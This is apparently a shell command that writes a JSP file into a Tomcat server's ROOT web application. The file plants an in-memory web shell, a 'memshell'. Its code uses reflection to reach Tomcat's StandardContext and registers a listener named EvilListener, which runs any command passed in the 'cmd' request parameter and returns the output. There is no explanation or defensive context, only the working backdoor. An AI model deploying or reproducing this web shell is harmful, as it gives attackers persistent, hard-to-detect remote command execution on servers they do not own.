
cat > /usr/local/tomcat/webapps/ROOT/memshell/listener_inject.jsp << 'EOF'
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.*" %>
<%@ page import="java.io.*" %>
<% 
    class EvilListener implements ServletRequestListener{
        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            ServletRequest req=sre.getServletRequest();
            if (!(req instanceof HttpServletRequest)){
                return;
            }
            HttpServletRequest request=(HttpServletRequest)req;
            String cmd=request.getParameter("cmd");
            if(cmd!=null&&!cmd.isEmpty()){
                try{
                    Process p =Runtime.getRuntime().exec(cmd);
                    BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
                    StringBuilder result=new StringBuilder();
                    String line=null;
                    while ((line=br.readLine())!=null){
                        result.append(line).append('\n');
                    }
                    p.waitFor();
                    request.setAttribute("listener-result",result.toString());
                    request.setAttribute("listener-cmd",cmd);

                }catch(Exception e){
                    request.setAttribute("listener-error",e.toString());
                }
            }
        }
        @Override
        public void requestDestroyed(ServletRequestEvent sre){

        }

    }
    StandardContext sct=null;
    ClassLoader cl=Thread.currentThread().getContextClassLoader();
    Class<?> clazz=cl.getClass();
    Object resources=null;
    while(clazz!=null&& resources==null){
        try{
            Field rf=clazz.getDeclaredField("resources");
            rf.setAccessible(true);
            resources=rf.get(cl);
        }catch(NoSuchFieldException e){
            clazz=clazz.getSuperclass();
        }

    }
    if (resources==null){
        throw new Exception("找不到resources字段");
    }
    Class<?> rclazz=resources.getClass();
    while(rclazz!=null && sct==null){
        try{
            Field cf=rclazz.getDeclaredField("context");
            cf.setAccessible(true);
            sct=(StandardContext)cf.get(resources);
        }catch(NoSuchFieldException e){
            rclazz=rclazz.getSuperclass();
        }

    }
    if(sct==null){
        throw new Exception("找不到context字段");
    }
    try{
        EvilListener elistener =new EvilListener();
        sct.addApplicationEventListener(elistener);
    }catch(Exception e){
        
    }
    
    out.println("ok");

    String resultout=(String)request.getAttribute("listener-result");
    String cmd=(String)request.getAttribute("listener-cmd");
    if(resultout!=null&&!resultout.isEmpty()){
        out.println("Command:"+cmd+"result:"+resultout);
    }
%>
EOF